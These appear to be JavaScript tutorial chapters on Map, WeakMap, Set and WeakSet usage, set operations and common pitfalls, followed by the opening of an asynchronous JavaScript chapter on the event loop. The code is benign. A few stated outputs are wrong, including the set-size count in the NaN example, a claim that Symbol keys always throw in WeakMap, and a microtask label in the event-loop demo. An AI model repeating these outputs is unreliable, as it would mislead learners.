// âœ… Use WeakMap for private instance data
const privateData = new WeakMap();

class User {
  constructor(name, email) {
    this.name = name;  // Public
    
    // Private data stored in WeakMap
    privateData.set(this, {
      email: email,
      password: null,
      createdAt: new Date()
    });
  }
  
  setPassword(pwd) {
    const data = privateData.get(this);
    if (data) {
      data.password = pwd;
    }
  }
  
  getEmail() {
    const data = privateData.get(this);
    return data ? data.email : null;
  }
}

const user = new User('Alice', 'alice@example.com');
console.log(user.name);        // 'Alice' (public)
console.log(user.getEmail());  // 'alice@example.com' (private access)

// Cannot access private data directly
const data = privateData;  // Would need reference to weakMap
```

### Use Case 2: Caching with Automatic Cleanup

```javascript
// âœ… Cache DOM nodes without preventing garbage collection
const domCache = new WeakMap();

class ComponentManager {
  render(element) {
    // Store component state without preventing GC
    const state = {
      mounted: true,
      listeners: [],
      timestamp: Date.now()
    };
    
    domCache.set(element, state);
  }
  
  getState(element) {
    return domCache.get(element);
  }
}

const manager = new ComponentManager();
let div = document.createElement('div');

manager.render(div);
console.log(manager.getState(div).mounted);  // true

// When element is removed from DOM:
div = null;  // Reference removed

// Element can be garbage collected now
// Cache entry will disappear automatically
```

### Use Case 3: Object Metadata

```javascript
// âœ… Attach metadata to objects without modifying them
const metadata = new WeakMap();

function addMetadata(obj, meta) {
  metadata.set(obj, meta);
}

function getMetadata(obj) {
  return metadata.get(obj);
}

class User {
  constructor(name) {
    this.name = name;
  }
}

const user1 = new User('Alice');
const user2 = new User('Bob');

// Attach metadata
addMetadata(user1, { role: 'admin', permissions: ['read', 'write'] });
addMetadata(user2, { role: 'user', permissions: ['read'] });

// Access metadata
console.log(getMetadata(user1).role);  // 'admin'
console.log(getMetadata(user2).role);  // 'user'

// Original objects unchanged
console.log(user1);  // { name: 'Alice' } - no metadata property
```

### Use Case 4: DOM Element Events

```javascript
// âœ… Avoid memory leaks with DOM listeners
const elementListeners = new WeakMap();

class EventManager {
  addEventListener(element, event, handler) {
    if (!elementListeners.has(element)) {
      elementListeners.set(element, new Map());
    }
    
    const listeners = elementListeners.get(element);
    if (!listeners.has(event)) {
      listeners.set(event, []);
    }
    
    listeners.get(event).push(handler);
    element.addEventListener(event, handler);
  }
  
  removeAllListeners(element) {
    const listeners = elementListeners.get(element);
    if (!listeners) return;
    
    for (const [event, handlers] of listeners) {
      for (const handler of handlers) {
        element.removeEventListener(event, handler);
      }
    }
  }
}

const manager = new EventManager();
let button = document.querySelector('button');

// Add listeners
manager.addEventListener(button, 'click', () => console.log('Clicked!'));

// When element is removed from DOM:
manager.removeAllListeners(button);
button = null;  // Can be garbage collected
```

---

## Best Practices

### âœ… DO

```javascript
// âœ… Use Map for collections with non-string keys
const cache = new Map();
const userObj = { id: 1 };
cache.set(userObj, 'data');  // Works perfectly

// âœ… Use WeakMap for private data
const privateData = new WeakMap();
class Secret {
  constructor(value) {
    privateData.set(this, value);
  }
}

// âœ… Check has() before get() when important
const map = new Map();
if (map.has('key')) {
  const value = map.get('key');
  // Process value
}

// âœ… Use for...of for simple iteration
for (const [key, value] of map) {
  console.log(key, value);
}

// âœ… Cache WeakMap references to keys
const weakMap = new WeakMap();
const key = { id: 1 };
weakMap.set(key, 'value');
console.log(weakMap.has(key));  // Works while key reference exists
```

### âŒ DON'T

```javascript
// âŒ Don't assume WeakMap keys persist
let key = { id: 1 };
const wm = new WeakMap();
wm.set(key, 'value');

key = null;
// WeakMap entry may disappear due to GC
console.log(wm.has(key));  // false (key is now null anyway)

// âŒ Don't try to iterate WeakMap
const wm = new WeakMap();
// for (const entry of wm) {}  // TypeError
// wm.forEach(...)  // TypeError

// âŒ Don't use primitives as WeakMap keys
const wm = new WeakMap();
// wm.set('string', 'value');  // TypeError
// wm.set(42, 'value');         // TypeError

// âŒ Don't rely on WeakMap size
const wm = new WeakMap();
console.log(wm.size);  // undefined

// âŒ Don't forget WeakMap use cases are specific
// For most collections, use Map instead
// WeakMap is for private data, caching, metadata
```

### Performance Considerations

```javascript
// âœ… WeakMap for large collections of objects
// GC will clean up unused entries automatically
const domNodeCache = new WeakMap();

// âœ… Map for smaller collections or frequent access
const userCache = new Map();

// âœ… Map when you need iteration
const settings = new Map([
  ['theme', 'dark'],
  ['language', 'en'],
  ['timezone', 'UTC']
]);

for (const [key, value] of settings) {
  console.log(`${key}: ${value}`);
}
```

---

## Summary

### Maps Key Points

| Feature | Details |
|---------|---------|
| **Key types** | Any type (string, number, object, etc.) |
| **Access** | .set(), .get(), .has(), .delete() |
| **Iteration** | for...of, .keys(), .values(), .entries(), .forEach() |
| **Size** | .size property available |
| **Use when** | Non-string keys, frequent add/delete, need .size |

### WeakMaps Key Points

| Feature | Details |
|---------|---------|
| **Key types** | Objects only |
| **Weak refs** | Keys don't prevent garbage collection |
| **Access** | .set(), .get(), .has(), .delete() |
| **Iteration** | âŒ Not iterable |
| **Size** | âŒ No .size property |
| **Use when** | Private data, metadata, caching, DOM associations |

### Quick Comparison

```javascript
// Map: Flexible key collection
const map = new Map();
map.set('string', 1);
map.set(42, 2);
map.set({}, 3);
console.log(map.size);  // 3
for (const [k, v] of map) {}  // Works

// WeakMap: Private/metadata storage
const wm = new WeakMap();
wm.set({}, 'metadata');
// Cannot iterate, size unknown
// Keys can be garbage collected
```

### Next Steps

- **Module 12.3** - Learn about Sets and their operations
- **Module 12.4** - Explore WeakSets for object tagging
- Combine Maps/WeakMaps with other data structures
- Use in real applications for caching and state management
## Sets and WeakSets



## Creating Sets

### Basic Set Creation

```javascript
// âœ… Empty set
const set1 = new Set();

// âœ… Initialize from array
const set2 = new Set([1, 2, 3, 2, 1]);
console.log(set2.size);  // 3 (duplicates removed)

// âœ… Initialize from string (each character)
const set3 = new Set('hello');
console.log([...set3]);  // ['h', 'e', 'l', 'o'] (l appears once)

// âœ… Initialize from another set
const original = new Set(['a', 'b', 'c']);
const copy = new Set(original);

// âœ… Initialize with iterable
const set4 = new Set(new Map([['key1', 'val1'], ['key2', 'val2']]).keys());
console.log([...set4]);  // ['key1', 'key2']
```

### Creating Sets with Different Value Types

```javascript
const set = new Set();

// âœ… Primitives
set.add('string');
set.add(42);
set.add(3.14);
set.add(true);
set.add(false);
set.add(null);
set.add(undefined);
set.add(Symbol('sym'));
set.add(BigInt(9007199254740991));

// âœ… Objects (reference-based)
const obj1 = { id: 1 };
const obj2 = { id: 1 };  // Different reference!
set.add(obj1);
set.add(obj2);  // Both added (different references)

console.log(set.size);  // 9 + 2 = 11

// âœ… Functions
const fn1 = () => {};
const fn2 = () => {};
set.add(fn1);
set.add(fn2);  // Different functions

// âœ… NaN is special (all NaN are same value)
set.add(NaN);
set.add(NaN);  // Not added (duplicate)
console.log(set.size);  // Still 13, not 14
```

---

## Set Methods: add(), has(), delete(), clear()

### add() - Adding Values

```javascript
const set = new Set();

// âœ… add() returns the set (allows chaining)
set.add('first')
   .add('second')
   .add('third');

console.log(set.size);  // 3

// âœ… Attempting to add duplicate returns set without adding
set.add('first');  // Not added
console.log(set.size);  // Still 3

// âœ… add() returns the same set for chaining
const result = set.add('new');
console.log(result === set);  // true

// âœ… Can add any value type
const set2 = new Set();
set2.add(42);
set2.add('forty-two');
set2.add({ value: 42 });
set2.add(null);
set2.add(undefined);
```

### has() - Checking for Values

```javascript
const set = new Set(['apple', 'banana', 'cherry']);

// âœ… Check if value exists
console.log(set.has('apple'));   // true
console.log(set.has('banana'));  // true
console.log(set.has('grape'));   // false

// âœ… Works with any type
const set2 = new Set();
set2.add(42);
set2.add(true);
set2.add(null);

console.log(set2.has(42));        // true
console.log(set2.has(true));      // true
console.log(set2.has(null));      // true
console.log(set2.has('42'));      // false (different type)

// âœ… Useful in conditionals
if (set.has('apple')) {
  console.log('Apple is in the set');
}

// âœ… Safe existence check
const items = new Set([1, 2, 3]);
const checkValue = (val) => items.has(val) ? 'found' : 'not found';
console.log(checkValue(2));  // 'found'
console.log(checkValue(5));  // 'not found'
```

### delete() - Removing Values

```javascript
const set = new Set(['a', 'b', 'c', 'd']);

// âœ… delete() returns true if value existed
console.log(set.delete('b'));  // true (was deleted)
console.log(set.delete('b'));  // false (already deleted)
console.log(set.delete('z'));  // false (never existed)

console.log(set.size);  // 3
console.log([...set]);  // ['a', 'c', 'd']

// âœ… Chain conditions
const set2 = new Set([1, 2, 3, 4, 5]);
if (set2.has(3)) {
  set2.delete(3);
}

// âœ… Delete with reference checking
const obj = { id: 1 };
const set3 = new Set();
set3.add(obj);

console.log(set3.delete(obj));      // true
console.log(set3.delete({ id: 1 })); // false (different reference)
```

### clear() - Removing All Values

```javascript
const set = new Set(['a', 'b', 'c', 'd', 'e']);

console.log(set.size);  // 5

// âœ… clear() removes everything
set.clear();

console.log(set.size);  // 0
console.log([...set]);  // []

// âœ… Set is reusable after clear
set.add('new');
console.log(set.size);  // 1
```

---

## Set Size and Properties

### The size Property

```javascript
const set = new Set();

// âœ… size property (read-only)
console.log(set.size);  // 0

set.add('a');
console.log(set.size);  // 1

set.add('b');
set.add('c');
console.log(set.size);  // 3

// âœ… Adding duplicate doesn't change size
set.add('a');  // Already exists
console.log(set.size);  // Still 3

// âœ… delete() decreases size
set.delete('b');
console.log(set.size);  // 2

// âœ… clear() resets size
set.clear();
console.log(set.size);  // 0

// âœ… Can't set size directly
set.size = 100;  // Fails silently
console.log(set.size);  // Still 0
```

### Constructor Property

```javascript
const set = new Set();
console.log(set.constructor === Set);  // true

// âœ… Type checking
function isSet(obj) {
  return obj instanceof Set;
  // or: obj.constructor === Set;
}

console.log(isSet(new Set()));    // true
console.log(isSet([]));           // false
console.log(isSet(new Map()));    // false
```

---

## Iterating Sets

### for...of Loop

```javascript
const set = new Set(['a', 'b', 'c']);

// âœ… Iterate values
for (const value of set) {
  console.log(value);  // 'a', 'b', 'c'
}

// âœ… Default iteration is same as values()
for (const value of set.values()) {
  console.log(value);  // Same output
}

// âœ… Destructuring from set
const [first, second] = set;
console.log(first, second);  // 'a', 'b'
```

### values() - Iterating Values

```javascript
const set = new Set([10, 20, 30]);

// âœ… Iterate values
for (const value of set.values()) {
  console.log(value);  // 10, 20, 30
}

// âœ… Convert to array
const valueArray = [...set.values()];
console.log(valueArray);  // [10, 20, 30]

// âœ… Get first value
const iterator = set.values();
const firstValue = iterator.next().value;
console.log(firstValue);  // 10
```

### keys() - Same as values()

```javascript
const set = new Set(['x', 'y', 'z']);

// âœ… For Sets, keys() returns same as values()
for (const key of set.keys()) {
  console.log(key);  // 'x', 'y', 'z'
}

// This exists for compatibility with Map
console.log(set.keys() === set.values());  // false (different iterators)
console.log([...set.keys()]);  // ['x', 'y', 'z']
```

### entries() - [value, value] Pairs

```javascript
const set = new Set(['a', 'b', 'c']);

// âœ… entries() returns [value, value] pairs
for (const [key, value] of set.entries()) {
  console.log(key === value);  // true (always true for Set)
}

// âœ… Convert to array
const entriesArray = [...set.entries()];
console.log(entriesArray);  // [['a', 'a'], ['b', 'b'], ['c', 'c']]
```

### forEach() - Functional Iteration

```javascript
const set = new Set([1, 2, 3, 4, 5]);

// âœ… forEach with callback
set.forEach((value) => {
  console.log(value);  // 1, 2, 3, 4, 5
});

// âœ… forEach with this context
class Processor {
  constructor(prefix) {
    this.prefix = prefix;
  }
  
  processSet(set) {
    set.forEach(function(value) {
      console.log(this.prefix + value);
    }, this);
  }
}

new Processor('>> ').processSet(new Set(['a', 'b', 'c']));
// >> a, >> b, >> c

// âœ… Collecting values
const doubled = [];
set.forEach(value => doubled.push(value * 2));
console.log(doubled);  // [2, 4, 6, 8, 10]
```

---

## Set Operations

### Union (Combine Two Sets)

```javascript
// âœ… Union of two sets
const set1 = new Set([1, 2, 3]);
const set2 = new Set([2, 3, 4]);

const union = new Set([...set1, ...set2]);
console.log([...union]);  // [1, 2, 3, 4]

// âœ… As a function
function setUnion(setA, setB) {
  return new Set([...setA, ...setB]);
}

const result = setUnion(set1, set2);
console.log([...result]);  // [1, 2, 3, 4]
```

### Intersection (Common Elements)

```javascript
// âœ… Intersection of two sets
const set1 = new Set([1, 2, 3, 4]);
const set2 = new Set([2, 3, 5, 6]);

const intersection = new Set([...set1].filter(x => set2.has(x)));
console.log([...intersection]);  // [2, 3]

// âœ… As a function
function setIntersection(setA, setB) {
  return new Set([...setA].filter(x => setB.has(x)));
}

const result = setIntersection(set1, set2);
console.log([...result]);  // [2, 3]
```

### Difference (Elements in A but not in B)

```javascript
// âœ… Difference of two sets
const set1 = new Set([1, 2, 3, 4]);
const set2 = new Set([2, 3, 5, 6]);

const difference = new Set([...set1].filter(x => !set2.has(x)));
console.log([...difference]);  // [1, 4]

// âœ… As a function
function setDifference(setA, setB) {
  return new Set([...setA].filter(x => !setB.has(x)));
}

const result = setDifference(set1, set2);
console.log([...result]);  // [1, 4]
```

### Symmetric Difference (Elements in either A or B, but not both)

```javascript
// âœ… Symmetric difference
const set1 = new Set([1, 2, 3, 4]);
const set2 = new Set([2, 3, 5, 6]);

const symDiff = new Set([
  ...setDifference(set1, set2),
  ...setDifference(set2, set1)
]);

console.log([...symDiff]);  // [1, 4, 5, 6]

// âœ… As a function
function setSymmetricDifference(setA, setB) {
  const diffAB = new Set([...setA].filter(x => !setB.has(x)));
  const diffBA = new Set([...setB].filter(x => !setA.has(x)));
  return new Set([...diffAB, ...diffBA]);
}
```

### Subset Check (All of A in B)

```javascript
// âœ… Check if set1 is subset of set2
const set1 = new Set([1, 2]);
const set2 = new Set([1, 2, 3, 4]);

function isSubset(setA, setB) {
  for (const item of setA) {
    if (!setB.has(item)) return false;
  }
  return true;
}

console.log(isSubset(set1, set2));  // true
console.log(isSubset(set2, set1));  // false
```

---

## Sets vs Arrays

### Performance Comparison

```javascript
// âœ… Set is faster for membership testing
const array = [1, 2, 3, 4, 5, 1000000];
const set = new Set(array);

// Checking membership
console.time('Array includes');
for (let i = 0; i < 100000; i++) {
  array.includes(1000000);  // O(n) search
}
console.timeEnd('Array includes');  // Much slower

console.time('Set has');
for (let i = 0; i < 100000; i++) {
  set.has(1000000);  // O(1) lookup
}
console.timeEnd('Set has');  // Much faster
```

### When to Use Each

```javascript
// âœ… Use Set when:
// - Need unique values only
// - Frequent membership checking
// - Add/remove operations common
// - Don't need index-based access

const uniqueUsers = new Set();
uniqueUsers.add(user1);
uniqueUsers.add(user2);
if (uniqueUsers.has(user3)) { }

// âœ… Use Array when:
// - Need indexed access
// - Order and duplicates matter
// - Need array methods (map, filter, etc.)
// - JSON serialization needed

const numbers = [1, 2, 2, 3, 3, 3];
const doubled = numbers.map(x => x * 2);
console.log(numbers[0]);  // Index access
```

### Converting Between Set and Array

```javascript
// Array â†’ Set (remove duplicates)
const array = [1, 2, 2, 3, 3, 3, 4, 4];
const set = new Set(array);
console.log([...set]);  // [1, 2, 3, 4]

// Set â†’ Array
const set2 = new Set(['a', 'b', 'c']);
const array2 = [...set2];  // Or Array.from(set2)
console.log(array2);  // ['a', 'b', 'c']

// Remove duplicates from array
function deduplicate(arr) {
  return [...new Set(arr)];
}

console.log(deduplicate([1, 2, 2, 3, 3, 3]));  // [1, 2, 3]
```

---

## Practical Set Examples

### Example 1: Unique Items Tracking

```javascript
class UniqueItemTracker {
  constructor() {
    this.items = new Set();
    this.history = [];
  }
  
  add(item) {
    if (!this.items.has(item)) {
      this.items.add(item);
      this.history.push({ action: 'add', item, time: Date.now() });
      return true;
    }
    return false;
  }
  
  remove(item) {
    if (this.items.delete(item)) {
      this.history.push({ action: 'remove', item, time: Date.now() });
      return true;
    }
    return false;
  }
  
  getAll() {
    return [...this.items];
  }
  
  count() {
    return this.items.size;
  }
}

const tracker = new UniqueItemTracker();
console.log(tracker.add('item1'));  // true
console.log(tracker.add('item1'));  // false (duplicate)
console.log(tracker.add('item2'));  // true
console.log(tracker.count());       // 2
```

### Example 2: Finding Unique Elements

```javascript
// Find unique elements in multiple arrays
function findUnique(arrays) {
  const all = new Set();
  const duplicates = new Set();
  
  for (const arr of arrays) {
    for (const item of arr) {
      if (all.has(item)) {
        duplicates.add(item);
      } else {
        all.add(item);
      }
    }
  }
  
  // Return items that appear exactly once
  return [...all].filter(item => !duplicates.has(item));
}

const result = findUnique([
  [1, 2, 3],
  [2, 3, 4],
  [4, 5, 6]
]);

console.log(result);  // [1, 5, 6] (appear in only one array)
```

### Example 3: Tag System

```javascript
class TagManager {
  constructor() {
    this.tags = new Set();
  }
  
  addTag(tag) {
    this.tags.add(tag.toLowerCase());
  }
  
  hasTag(tag) {
    return this.tags.has(tag.toLowerCase());
  }
  
  removeTag(tag) {
    this.tags.delete(tag.toLowerCase());
  }
  
  getTags() {
    return [...this.tags].sort();
  }
  
  getTagCount() {
    return this.tags.size;
  }
  
  mergeTags(other) {
    return new Set([...this.tags, ...other.tags]);
  }
}

const post = new TagManager();
post.addTag('JavaScript');
post.addTag('Tutorial');
post.addTag('javascript');  // Duplicate (case-insensitive)

console.log(post.getTags());        // ['javascript', 'tutorial']
console.log(post.getTagCount());    // 2
```

### Example 4: Word Frequency Analysis

```javascript
function analyzeWords(text) {
  const words = text.toLowerCase().match(/\b\w+\b/g) || [];
  const unique = new Set(words);
  
  return {
    total: words.length,
    unique: unique.size,
    coverage: (unique.size / words.length * 100).toFixed(2) + '%',
    words: [...unique].sort()
  };
}

const text = "The quick brown fox jumps over the lazy dog";
const analysis = analyzeWords(text);

console.log(analysis);
// { total: 9, unique: 8, coverage: '88.89%', words: ['brown', 'dog', ...] }
```

---

## WeakSet: Weak References

### What is a WeakSet?

A **WeakSet** is like a Set but:
- Values must be **objects only** (no primitives)
- Values are held **weakly** (don't prevent garbage collection)
- Values can be garbage collected even if in WeakSet
- **Not iterable** (no forEach, no iteration methods)
- **No size property**

```javascript
// âœ… WeakSet with object values
const weakSet = new WeakSet();
const obj1 = { id: 1 };
const obj2 = { id: 2 };

weakSet.add(obj1);
weakSet.add(obj2);

console.log(weakSet.has(obj1));  // true
console.log(weakSet.has(obj2));  // true

// âŒ WeakSet cannot have primitive values
const ws = new WeakSet();
// ws.add('string');  // TypeError
// ws.add(42);         // TypeError
// ws.add(true);       // TypeError
```

### WeakSet Methods and Behavior

```javascript
const weakSet = new WeakSet();
const obj = { id: 1 };

// âœ… add() - Add value
weakSet.add(obj);

// âœ… has() - Check existence
console.log(weakSet.has(obj));  // true

// âœ… delete() - Remove
weakSet.delete(obj);
console.log(weakSet.has(obj));  // false

// âŒ NO size property
console.log(weakSet.size);  // undefined

// âŒ NO iteration methods
// weakSet.forEach(...)  // TypeError
// for (const item of weakSet) {}  // TypeError
// [...weakSet.values()]  // TypeError
```

---

## WeakSet Use Cases

### Use Case 1: Object Tagging

```javascript
// âœ… Mark objects without modifying them
const processed = new WeakSet();

class DataProcessor {
  process(obj) {
    if (processed.has(obj)) {
      console.log('Already processed');
      return;
    }
    
    // Process object
    console.log('Processing:', obj);
    processed.add(obj);  // Mark as processed
  }
}

const processor = new DataProcessor();
const obj = { data: 'value' };

processor.process(obj);   // Processing: { data: 'value' }
processor.process(obj);   // Already processed
```

### Use Case 2: Detecting Cycles in Graphs

```javascript
// âœ… Detect circular references
function hasCycle(obj) {
  const visited = new WeakSet();
  
  function visit(node) {
    if (typeof node !== 'object' || node === null) {
      return false;
    }
    
    if (visited.has(node)) {
      return true;  // Cycle detected
    }
    
    visited.add(node);
    
    for (const key in node) {
      if (node.hasOwnProperty(key)) {
        if (visit(node[key])) {
          return true;
        }
      }
    }
    
    visited.delete(node);  // Backtrack
    return false;
  }
  
  return visit(obj);
}

const circular = { a: 1 };
circular.self = circular;

console.log(hasCycle(circular));  // true
console.log(hasCycle({ a: 1 }));  // false
```

### Use Case 3: Tracking DOM Elements

```javascript
// âœ… Track processed DOM elements
const processedElements = new WeakSet();

class DOMHandler {
  process(element) {
    if (processedElements.has(element)) {
      return;  // Already handled
    }
    
    // Attach event listeners, etc.
    element.addEventListener('click', () => console.log('Clicked'));
    
    processedElements.add(element);
  }
  
  unprocess(element) {
    processedElements.delete(element);
  }
}

const handler = new DOMHandler();
const button = document.querySelector('button');

if (button) {
  handler.process(button);
  // When button removed from DOM and GC runs,
  // WeakSet entry is automatically cleaned up
}
```

### Use Case 4: Request Tracking

```javascript
// âœ… Track active requests without preventing GC
const activeRequests = new WeakSet();

class RequestManager {
  async fetchData(controller) {
    if (activeRequests.has(controller)) {
      throw new Error('Request already in progress');
    }
    
    activeRequests.add(controller);
    
    try {
      const response = await fetch(url, { signal: controller.signal });
      return await response.json();
    } finally {
      activeRequests.delete(controller);
    }
  }
  
  isActive(controller) {
    return activeRequests.has(controller);
  }
}

const manager = new RequestManager();
const controller = new AbortController();

manager.fetchData(controller).catch(console.error);
console.log(manager.isActive(controller));  // true
```

---

## Best Practices

### âœ… DO

```javascript
// âœ… Use Set for unique values
const userIds = new Set();
userIds.add(1);
userIds.add(2);
userIds.add(1);  // Duplicate ignored
console.log(userIds.size);  // 2

// âœ… Use WeakSet for object tagging
const processed = new WeakSet();
processed.add(obj);  // Won't prevent GC

// âœ… Check size before operations
if (set.size > 0) {
  const first = [...set][0];
}

// âœ… Use Set operations appropriately
const union = new Set([...set1, ...set2]);

// âœ… Convert to array for advanced operations
const doubled = [...set].map(x => x * 2);
```

### âŒ DON'T

```javascript
// âŒ Don't use primitives in WeakSet
const ws = new WeakSet();
// ws.add('string');  // TypeError
// ws.add(42);         // TypeError

// âŒ Don't assume WeakSet has size
console.log(ws.size);  // undefined

// âŒ Don't try to iterate WeakSet
// for (const item of ws) {}  // TypeError

// âŒ Don't expect WeakSet to prevent GC
let obj = { id: 1 };
const ws2 = new WeakSet();
ws2.add(obj);

obj = null;
// Object can be garbage collected
// WeakSet entry will disappear

// âŒ Don't forget to handle duplicates manually with Array
const arr = [1, 2, 2, 3];  // Has duplicates
// Set automatically removes them
const unique = new Set(arr);
```

---

## Summary

### Sets Key Points

| Feature | Details |
|---------|---------|
| **Uniqueness** | Automatically enforced |
| **Value types** | Any type (primitives and objects) |
| **Methods** | add(), has(), delete(), clear() |
| **Iteration** | for...of, .keys(), .values(), .entries(), .forEach() |
| **Size** | .size property available |
| **Operations** | Union, intersection, difference, symmetric difference |

### WeakSets Key Points

| Feature | Details |
|---------|---------|
| **Value types** | Objects only |
| **Weak refs** | Values don't prevent garbage collection |
| **Methods** | add(), has(), delete() |
| **Iteration** | âŒ Not iterable |
| **Size** | âŒ No .size property |
| **Use when** | Object tagging, cycle detection, tracking |

### Quick Comparison

```javascript
// Set: Collection of unique values
const set = new Set([1, 2, 2, 3]);
console.log(set.size);  // 3
for (const value of set) { }  // Iterable

// WeakSet: Weak references to objects
const ws = new WeakSet();
ws.add(obj);  // Won't prevent GC
// Cannot iterate, no size
```

---

## Common Pitfalls

### Pitfall 1: Object Keys in Map

```javascript
// âŒ GOTCHA: Objects as keys are compared by reference
const map = new Map();

map.set({ id: 1 }, 'user1');
console.log(map.get({ id: 1 }));  // undefined! Different object!

// âœ… CORRECT: Reuse the same object reference
const key = { id: 1 };
map.set(key, 'user1');
console.log(map.get(key));  // 'user1'

// Or use a primitive key
map.set('user:1', 'user1');
console.log(map.get('user:1'));  // 'user1'
```

### Pitfall 2: WeakMap with Primitives

```javascript
// âŒ WRONG: WeakMap keys must be objects
const weakMap = new WeakMap();
weakMap.set('string', 'value');  // TypeError!
weakMap.set(123, 'value');       // TypeError!
weakMap.set(Symbol(), 'value');  // TypeError!

// âœ… CORRECT: Use object keys
weakMap.set({ id: 1 }, 'value');  // OK
weakMap.set(new Date(), 'value'); // OK
weakMap.set([], 'value');         // OK (arrays are objects)
```

### Pitfall 3: Set Doesn't Dedupe Objects

```javascript
// âŒ GOTCHA: Objects are compared by reference, not value
const set = new Set();

set.add({ name: 'Alice' });
set.add({ name: 'Alice' });

console.log(set.size);  // 2! Both objects added (different references)

// âœ… SOLUTION: Use primitives or serialize
const set2 = new Set();
set2.add(JSON.stringify({ name: 'Alice' }));
set2.add(JSON.stringify({ name: 'Alice' }));
console.log(set2.size);  // 1 (strings are compared by value)
```

### Pitfall 4: Map vs Object Performance

```javascript
// âš ï¸ For small collections, Object is often faster
// Map wins for: large collections, frequent add/delete, non-string keys

// âŒ OVERKILL: Map for small static data
const config = new Map([
  ['apiUrl', 'https://api.example.com'],
  ['timeout', 5000]
]);

// âœ… SIMPLER: Plain object for small static data
const config = {
  apiUrl: 'https://api.example.com',
  timeout: 5000
};

// âœ… Map shines with: dynamic keys, iteration needs, size tracking
const userCache = new Map();  // Better for caches
userCache.set(userId, user);
console.log(userCache.size);  // O(1) size access
```

### Pitfall 5: WeakMap Doesn't Prevent Closure Leaks

```javascript
// âŒ GOTCHA: WeakMap doesn't help if you hold the key
const privateData = new WeakMap();

function createLeak() {
  const obj = { data: 'sensitive' };
  privateData.set(obj, 'secret');
  
  return function() {
    // Closure holds reference to obj â€” it won't be GC'd!
    return privateData.get(obj);
  };
}

const getSecret = createLeak();
// obj is never garbage collected because getSecret holds a reference

// âœ… WeakMap works when keys are externally managed
function attachMetadata(element, metadata) {
  privateData.set(element, metadata);
}
// When element is removed from DOM and no other refs exist, entry is GC'd
```

---

### Next Steps

- Combine Maps/WeakMaps with Sets/WeakSets
- Implement complex data structures
- Use in caching and memoization
- Handle special memory scenarios with WeakSet

## 12.3 Collections Summary

| Collection | Key Type | Iteration | Weak |
|------------|----------|-----------|------|
| `Map` | Any | Insertion order | No |
| `WeakMap` | Objects only | Not iterable | Yes |
| `Set` | Any (unique) | Insertion order | No |
| `WeakSet` | Objects only | Not iterable | Yes |

---

**End of Chapter 12: Collections**


# 13-Async-JavaScript.md

# 13 Asynchronous JavaScript

### Why Async Matters

JavaScript runs on a **single thread** â€” it can only do one thing at a time. Without async patterns, any slow operation (network requests, file reads, timers) would freeze the entire program.

Async JavaScript solves this through:

- **Event Loop** â€” Orchestrates non-blocking execution
- **Callbacks** â€” Functions called when operations complete
- **Promises** â€” Objects representing future values
- **async/await** â€” Clean syntax for promise-based code

Understanding async is essential because:
- Nearly all real-world JS involves async (APIs, user events, timers)
- Async bugs are hard to debug without understanding the event loop
- Performance depends on proper async patterns (parallel vs sequential)

---

## 13.1 Event Loop

The event loop is JavaScript's mechanism for handling async operations while remaining single-threaded.

### Call Stack

The **Call Stack** is a data structure that tracks function calls and their execution context.

```javascript
// âœ… Call stack in action
function a() {
  console.log('A: start');
  b();
  console.log('A: end');
}

function b() {
  console.log('B: start');
  c();
  console.log('B: end');
}

function c() {
  console.log('C: start');
  console.log('C: end');
}

a();

// Output:
// A: start
// B: start
// C: start
// C: end
// B: end
// A: end
```

### Call Stack Overflow

```javascript
// âŒ Stack overflow - infinite recursion
function recursive() {
  recursive();  // Keeps calling itself
}

// recursive();  // RangeError: Maximum call stack size exceeded

// âœ… Proper recursion with base case
function factorial(n) {
  if (n <= 1) return 1;  // Base case
  return n * factorial(n - 1);
}

console.log(factorial(5));  // 120
```

### Stack Trace

```javascript
// âœ… Stack trace shows call sequence
function outer() {
  middle();
}

function middle() {
  inner();
}

function inner() {
  throw new Error('Something went wrong');
}

try {
  outer();
} catch (error) {
  // Stack trace shows: inner â†’ middle â†’ outer
  console.log(error.stack);
}
```

---

## Task Queue (Macrotasks)

### What is a Macrotask?

**Macrotasks** include:
- `setTimeout()`
- `setInterval()`
- `setImmediate()` (Node.js)
- UI rendering
- I/O operations
- `requestAnimationFrame()` (browser)

```javascript
// âœ… Macrotasks are queued for later execution
console.log('Start');

setTimeout(() => {
  console.log('Macrotask 1');
}, 0);

setTimeout(() => {
  console.log('Macrotask 2');
}, 0);

console.log('End');

// Output:
// Start
// End
// Macrotask 1
// Macrotask 2
```

### Processing Macrotasks

```javascript
// âœ… One macrotask processed at a time
setTimeout(() => {
  console.log('Task 1');
}, 0);

setTimeout(() => {
  console.log('Task 2');
}, 0);

setTimeout(() => {
  console.log('Task 3');
}, 0);

// Output: Task 1, Task 2, Task 3
// (Each task fully completes before next begins)
```

### Macrotask Order

```javascript
// âœ… Multiple macrotasks execute in FIFO order
for (let i = 1; i <= 3; i++) {
  setTimeout(() => {
    console.log(`Timeout ${i}`);
  }, 0);
}

console.log('Sync code');

// Output:
// Sync code
// Timeout 1
// Timeout 2
// Timeout 3
```

---

## Microtask Queue

### What is a Microtask?

**Microtasks** include:
- `Promise.then()`, `Promise.catch()`, `Promise.finally()`
- `queueMicrotask()`
- `MutationObserver` (browser)
- `process.nextTick()` (Node.js)

```javascript
// âœ… Microtasks execute BEFORE macrotasks
console.log('Start');

Promise.resolve()
  .then(() => {
    console.log('Microtask');
  });

setTimeout(() => {
  console.log('Macrotask');
}, 0);

console.log('End');

// Output:
// Start
// End
// Microtask
// Macrotask
```

### Microtask Priority

```javascript
// âœ… ALL microtasks run before ANY macrotask
console.log('1. Sync');

setTimeout(() => {
  console.log('2. Macrotask 1');
}, 0);

Promise.resolve()
  .then(() => {
    console.log('3. Microtask 1');
  })
  .then(() => {
    console.log('4. Microtask 2');
  });

setTimeout(() => {
  console.log('5. Macrotask 2');
}, 0);

queueMicrotask(() => {
  console.log('6. Microtask 3');
});

console.log('7. Sync');

// Output:
// 1. Sync
// 7. Sync
// 3. Microtask 1
// 4. Microtask 2
// 6. Microtask 3
// 2. Macrotask 1
// 5. Macrotask 2
```

---

## Event Loop Phases

### The Event Loop Algorithm

```
1. Execute all synchronous code (call stack)
2. When call stack is empty:
   a. Execute ALL microtasks (microtask queue)
   b. Execute ONE macrotask (task queue)
   c. Execute ALL microtasks again (after each macrotask)
   d. Optionally render UI
   e. Repeat from step 2b
```

### Phase Breakdown

```javascript
// âœ… Phase 1: Synchronous code
console.log('Phase 1: Sync');

// âœ… Queue macrotask
setTimeout(() => {
  console.log('Phase 2: Macrotask');
}, 0);

// âœ… Queue microtask
Promise.resolve()
  .then(() => {
    console.log('Phase 3: Microtask (after macrotask)');
  });

